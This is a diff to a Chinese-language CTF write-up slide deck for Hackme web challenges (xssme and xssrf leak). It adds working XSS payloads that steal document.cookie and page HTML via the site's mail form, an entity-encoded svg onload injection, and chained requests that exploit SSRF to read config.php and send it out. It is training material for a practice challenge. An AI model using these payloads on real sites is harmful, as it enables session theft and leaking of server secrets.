@@ -2,7 +2,9 @@
 # [Hackme CTF](https://hackme.inndy.tw/)
 ### 就上手
 
-jason3e7 20181130
+jason3e7 20181204
+
+Note:title:"第一次解Hackme CTF就上手"
 
 ---
 
@@ -11,6 +13,7 @@ jason3e7 20181130
 * [dafuq-manager 2](#/3)
 * [dafuq-manager 3](#/10)
 * [xssme](#/22)
+* [xssrf leak](#/32)
 
 ---
 
@@ -438,6 +441,10 @@ var xhttp = new XMLHttpRequest();
 xhttp.open("POST", "sendmail.php");
 xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhttp.send("to_user=hacker&subject=cookie&content="+document.cookie);
+var xhttp = new XMLHttpRequest();
+xhttp.open("GET", "setadmin.php");
+xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhttp.send("to_user=hacker&subject=cookie&content="+document.cookie);
 ```
 
 ---
@@ -447,6 +454,105 @@ xhttp.send("to_user=hacker&subject=cookie&content="+document.cookie);
 <svg/onload=&#x76;&#x61;&#x72;&#x20;&#x78;&#x68;&#x74;&#x74;&#x70;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x50;&#x4f;&#x53;&#x54;&#x22;&#x2c;&#x20;&#x22;&#x73;&#x65;&#x6e;&#x64;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x70;&#x68;&#x70;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x74;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x48;&#x65;&#x61;&#x64;&#x65;&#x72;&#x28;&#x22;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x2d;&#x54;&#x79;&#x70;&#x65;&#x22;&#x2c;&#x20;&#x22;&#x61;&#x70;&#x70;&#x6c;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2f;&#x78;&#x2d;&#x77;&#x77;&#x77;&#x2d;&#x66;&#x6f;&#x72;&#x6d;&#x2d;&#x75;&#x72;&#x6c;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x64;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x22;&#x74;&#x6f;&#x5f;&#x75;&#x73;&#x65;&#x72;&#x3d;&#x61;&#x62;&#x63;&#x64;&#x65;&#x26;&#x73;&#x75;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3d;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x26;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3d;&#x22;&#x2b;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;&#x3b;>
 ```
 * [Back to Web](#/1)
+
+---
+
+## xssrf leak hint
+* 目標 : Steal flag from source code file
+* 切入點
+  * 延續 xssme
+  * [SSRF](https://ctf-wiki.github.io/ctf-wiki/web/ssrf/)
+* 步驟
+  * [step1, search, 找出目標](#/37)
+  * [step2, construct, 建構語法](#/38)
+
+Note:
+* google 搜尋 XSSRF 就會找一些關鍵字, 有一點勝之不武
+  * robots.txt, 要重新學習並整合滲透測試的網站資訊收集, 給一個 domain, 要收集哪些東西.
+  * request.php
+  * 有點可惜, 應該好好看看 SSRF 應該可以自己找的到, 很多 web 的還是不熟, 放下身段學習.
+* SSRF 不熟, 其實可以快一點建立測試環境, 會比較快.
+
+---
+
+## xssrf leak cookie
+* PHPSESSID = xxx
+  * Admin only allowed from localhost, but you came from 192.168.123.1
+    * [如何正確的取得使用者 IP？](https://devco.re/blog/2014/06/19/client-ip-detection/) 
+    * Client-IP
+    * X-Forwarded-For
+    * REMOTE_ADDR
+    * ...
+* 但是方向看起來錯了
+
+---
+
+## xssrf leak construct 1
+```
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "sendmail.php");
+xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhttp.send("to_user=abcde&subject=cookie&content="+btoa(document.documentElement.innerHTML));
+```
+Note:<svg/onload=>
+
+---
+
+## xssrf leak html
+* sendmail.php
+* index.php
+* setadmin.php
+* request.php
+
+---
+
+## xssrf leak construct 2
+```
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "setadmin.php");
+xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhttp.onreadystatechange = function() { 
+if (this.readyState === XMLHttpRequest.DONE) {
+  var xhttp1 = new XMLHttpRequest();
+  xhttp1.open("POST", "sendmail.php");
+  xhttp1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+  xhttp1.send("to_user=abcde&subject=cookie&content="+btoa(this.responseText));
+}};
+xhttp.send("username=abcde");
+```
+* 帳號毀滅 !
+
+---
+
+## xssrf leak search
+* robots.txt
+```
+User-agent: *
+Disallow: /config.php
+Disallow: /you/cant/read/config.php/can/you?
+Disallow: /backup.zip
+```
+* [Back to xssme leak hint](#/32)
+
+---
+
+## xssrf leak construct 3
+```
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "request.php");
+xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhttp.onreadystatechange = function() { 
+if (this.readyState === XMLHttpRequest.DONE) {
+  var xhttp1 = new XMLHttpRequest();
+  xhttp1.open("POST", "sendmail.php");
+  xhttp1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+  xhttp1.send("to_user=ababc&subject=cookie&content="+btoa(this.responseText));
+}};
+xhttp.send("url=file:///var/www/html/config.php");
+```
+* [Back to Web](#/1)
+
+Note:路徑猜測是 ubuntu 預設路徑
 
 ---
 
